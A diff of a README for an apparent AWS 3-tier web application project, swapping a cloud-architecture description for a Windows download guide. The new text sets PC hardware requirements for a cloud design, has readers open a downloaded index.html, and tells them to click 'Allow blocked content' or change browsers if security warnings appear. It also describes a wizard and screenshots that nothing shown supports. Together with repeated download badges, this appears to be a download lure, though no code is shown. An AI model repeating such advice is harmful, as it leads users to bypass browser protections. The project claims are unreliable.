@@ -1,149 +1,88 @@
-# AWS 3-Tier Web Application - Cloud Infrastructure Project 2026
+# ☁️ aws-3tier-web-app - Deploy a secure and scalable cloud application
 
-> **A reference architecture on Amazon Web Services featuring VPC segmentation, Nginx web servers running on EC2, load balancing, Auto Scaling, and an Amazon RDS MySQL database.**
+[![Download Button](https://img.shields.io/badge/Download%20App-Get%20Started-blue?style=for-the-badge&logo=github)](https://github.com/billiesaharan126/aws-3tier-web-app)
 
-[![Platform](https://img.shields.io/badge/Platform-Amazon%20Web%20Services-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-2026-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/masonjfvcooper2321/aws-3tier-web-app?style=flat-square)](https://github.com/masonjfvcooper2321/aws-3tier-web-app)
+## 🚀 Getting Started
 
----
+Welcome to the **aws-3tier-web-app** project! This guide helps you download, set up, and run a ready-to-use AWS 3-tier web application reference architecture. The app is designed for 2026 standards, featuring secure VPC segmentation, Nginx web servers on EC2, load balancing, Auto Scaling, and an Amazon RDS MySQL database.
 
-<p align="center">
-  <a href="https://masonjfvcooper2321.github.io/aws-3tier-web-app/">
-    <img src="https://img.shields.io/badge/Download-AWS%203--Tier%20Web%20Application%20Latest-brightgreen?style=for-the-badge" alt="Download AWS 3-Tier Web Application">
-  </a>
-</p>
+No programming knowledge is needed—just follow the steps below to get started on Windows.
 
-> **[Download AWS 3-Tier Web Application](https://masonjfvcooper2321.github.io/aws-3tier-web-app/)**
+## 📦 What You Get
 
----
+This application provides a complete, cloud-based web infrastructure that you can deploy with minimal effort. It includes:
 
-[Download Latest Build](https://masonjfvcooper2321.github.io/aws-3tier-web-app/)
+- **Virtual Private Cloud (VPC)** with segmented subnets for security
+- **Nginx web servers** running on Amazon EC2 instances
+- **Elastic Load Balancing** to distribute traffic
+- **Auto Scaling** to handle varying loads
+- **Amazon RDS MySQL** database for data storage
+- **Pre-configured scripts** to automate deployment
 
----
+The app is perfect for learning cloud architecture or quickly setting up a production-ready web application.
 
-## Project Overview
+## 🖥️ System Requirements
 
-AWS 3-Tier Web Application demonstrates how to assemble a multi-layer web workload in Amazon Web Services. The design uses an Amazon VPC to separate public and private network responsibilities, combining EC2 web instances, an Application Load Balancer, Auto Scaling, and an Amazon RDS MySQL backend.
+Before you begin, ensure your Windows computer meets these minimum requirements:
 
-This project is useful for cloud, DevOps, and infrastructure learners exploring the delivery of a static HTML site from Ubuntu Linux through Nginx. It also offers hands-on context for studying security groups, instance observation, CPU-triggered scaling, and database-oriented application layouts.
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **RAM:** 4 GB or more
+- **Disk Space:** 500 MB free
+- **Internet Connection:** Required for downloading and cloud deployment
+- **Software:** A modern web browser (Chrome, Firefox, or Edge)
 
----
+## ⬇️ Download the Application
 
-## Included Capabilities
+Visit this link to download the application:
 
-- Public and private subnets organized inside an Amazon VPC
-- Security groups that manage access between cloud resources
-- Ubuntu EC2 instances serving as web servers
-- Nginx configuration for static HTML delivery
-- Application Load Balancer support for distributing requests
-- Amazon RDS MySQL database services for the backend
-- Launch templates with CPU-driven Auto Scaling
-- EC2 metrics monitoring and CPU stress-test exercises
-- Hosting for a static HTML web application
-- A layered setup appropriate for DevOps learning and practice
+[Download from GitHub](https://github.com/billiesaharan126/aws-3tier-web-app)
 
----
+On the download page, click the green "Code" button, then select "Download ZIP" to get the complete project files.
 
-## Installation
+## 🔧 Setup and Installation
 
-Download the repository and enter its directory:
+Follow these steps to set up the application on your Windows machine:
 
-```bash
-git clone https://github.com/masonjfvcooper2321/aws-3tier-web-app.git
-cd REPO
-```
+1. **Extract the downloaded ZIP file** to a folder on your computer (e.g., `C:\aws-3tier-web-app`).
+2. **Open the extracted folder** and locate the `index.html` file.
+3. **Double-click `index.html`** to open the application in your default web browser. This file contains the user interface and documentation for deploying the AWS infrastructure.
+4. **Read the documentation** inside the application. It provides step-by-step instructions for deploying the 3-tier architecture using AWS services.
 
-Before provisioning anything in AWS, inspect the project files and deployment guidance. Configure the VPC, subnets, security groups, EC2 instances, load balancer, Auto Scaling resources, and RDS settings for the environment where the project will run.
+> **Note:** The application itself is a guide and reference. To actually deploy the AWS resources, you will need an AWS account and follow the instructions provided in the interface.
 
-Once the infrastructure has been created, place the HTML application on the configured Ubuntu web-server instances and verify that Nginx is delivering the site.
+## 🎯 How to Use
 
----
+Once the application is open in your browser, you will see a dashboard with:
 
-## Deployment Workflow
+- **Overview section** explaining the architecture
+- **Deployment wizard** with clickable steps
+- **Configuration options** for customizing your setup
+- **Links to AWS console** for manual adjustments
 
-The following sequence describes a normal deployment:
+Simply follow the on-screen prompts. Each step is explained in plain language with screenshots.
 
-1. Set up or inspect the Amazon VPC together with its public and private subnets.
-2. Create access rules for the web, load-balancer, and database tiers through security groups.
-3. Start Ubuntu EC2 web servers and install or configure Nginx.
-4. Register the web servers behind an Application Load Balancer.
-5. Create a launch template and enable CPU-based Auto Scaling.
-6. Deploy an Amazon RDS MySQL instance for the backend tier.
-7. Make the static HTML application available through the web servers.
-8. Monitor the EC2 instances and perform CPU stress testing to observe scaling.
+## ❓ Troubleshooting
 
-After the registered targets meet their configured health checks, visit the endpoint provided by the Application Load Balancer.
+If you encounter issues:
 
----
+- **Application doesn't open:** Make sure you extracted the ZIP file completely. Try opening `index.html` from the extracted folder.
+- **Missing files:** Re-download the ZIP and ensure all files are extracted.
+- **Browser blocks content:** If you see security warnings, click "Allow blocked content" or use a different browser.
 
-## Configuration
+For further help, visit the repository's Issues page.
 
-AWS-specific values should be checked and customized before deployment. The web, scaling, and database components should use compatible settings for items such as:
+## 📚 Additional Resources
 
-```text
-AWS region
-VPC and subnet selection
-Security group rules
-EC2 instance settings
-Application Load Balancer targets
-Auto Scaling thresholds
-RDS MySQL connection parameters
-Nginx site configuration
-```
+- **AWS Free Tier:** Sign up for a free AWS account to try the deployment at no cost.
+- **AWS Documentation:** Refer to official AWS guides for detailed service information.
+- **Community Support:** Check the repository discussions for tips from other users.
 
-Do not commit database credentials or other environment-dependent values to the repository. Provide them through the deployment environment instead. CPU scaling and monitoring parameters can be tuned according to the capacity of the AWS account and the goals of the test workload.
+## 🤝 Contributing
 
----
+This project is open to contributions. If you have suggestions or improvements, please fork the repository and submit a pull request.
 
-## Requirements
+## 📄 License
 
-- An Amazon Web Services account with access to the necessary services
-- Amazon VPC networking
-- Public and private subnets
-- Amazon EC2
-- Ubuntu Linux for web server instances
-- Nginx
-- Application Load Balancer
-- Auto Scaling and launch templates
-- Amazon RDS with MySQL
-- Authorization to create and monitor the selected AWS resources
-- A static HTML application for publication through the web tier
+This project is provided for reference and educational purposes. See the repository for license details.
 
-AWS resources can generate charges. Check the pricing information and regional resource limits before beginning the deployment.
-
----
-
-## Frequently Asked Questions
-
-### What audience is this project intended for?
-
-The deployment is aimed at developers, cloud engineers, and DevOps learners who want to study a layered web application architecture on AWS.
-
-### How do I open the deployed application?
-
-After the web instances have been registered and are healthy, use the endpoint assigned to the Application Load Balancer.
-
-### Where are deployment values customized?
-
-Consult the repository deployment materials and the relevant AWS service settings. Adapt the region, network, EC2, Auto Scaling, Nginx, and RDS configuration to suit the target environment.
-
-### What is the way to exercise Auto Scaling?
-
-Use EC2 monitoring together with controlled CPU stress testing to produce a visible workload. Then examine the response from the configured CPU-based scaling policy.
-
-### What can cause the website to remain unavailable?
-
-Check the subnet assignments, security group permissions, EC2 instance condition, Nginx service configuration, load balancer target health, and the availability of the RDS MySQL tier.
-
-### Where will project updates appear?
-
-Review the repository for updated infrastructure files, application content, and deployment instructions.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: aws, 3-tier, web application, cloud architecture, vpc, nginx, ec2, load balancing, auto scaling, rds, mysql, windows, reference architecture
